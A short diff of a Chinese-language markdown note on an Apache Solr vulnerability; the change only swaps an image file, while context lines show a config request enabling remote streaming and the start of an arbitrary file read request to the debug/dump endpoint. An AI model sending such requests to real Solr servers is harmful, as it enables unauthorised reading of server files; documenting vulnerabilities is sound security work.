@@ -12,7 +12,7 @@ POST /solr/{name}/config
 {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
 ```
 出现这个报错说明漏洞存在
-![](img/1.png)  
+![](img/2.png)  
 - 任意文件读取：
 ```url
 POST /solr/{name}/debug/dump?param=ContentStreams
